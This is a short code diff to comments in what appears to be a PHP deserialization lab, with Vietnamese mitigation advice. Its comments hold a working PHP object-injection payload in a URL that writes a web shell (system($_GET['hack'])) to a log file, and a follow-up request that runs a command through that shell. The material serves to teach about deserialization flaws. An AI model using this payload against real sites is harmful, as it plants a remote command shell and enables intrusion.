@@ -19,11 +19,11 @@
 // Example 3
 // URL "/Deserialization.php"
 // URL "/exploit.php"
-// URL "/Deserialization.php?data=O:3:"App":2:{s:7:"logFile";s:8:"test.php";s:7:"logData";s:29:"<?php%20system($_GET["hack"])?>";}"
+// URL "/Deserialization.php?data=O:3:"App":2:{s:7:"logFile";s:8:"test.php";s:7:"logData";s:29:"<?php%20system($_GET["hack"])";}"
 // URL /logs/test.php?hack=id
-<!-- Để tránh lỗ hổng bảo mật Deserialization - 
-Không chấp nhận dữ liệu được tuần tự hóa từ một nguồn không đáng tin cậy
-Thực hiện kiểm tra tính toàn vẹn
-Theo dõi và ghi nhật ký quá trình gỡ bỏ yêu cầu và các lỗi
-Mã hóa quá trình tuần tự hóa
-Chạy trong quá trình khử không khí trong một môi trường bị cô lập với quyền truy cập hạn chế -->
+// Để tránh lỗ hổng bảo mật Deserialization - 
+// Không chấp nhận dữ liệu được tuần tự hóa từ một nguồn không đáng tin cậy
+// Thực hiện kiểm tra tính toàn vẹn
+// Theo dõi và ghi nhật ký quá trình gỡ bỏ yêu cầu và các lỗi
+// Mã hóa quá trình tuần tự hóa
+// Chạy trong quá trình khử không khí trong một môi trường bị cô lập với quyền truy cập hạn chế
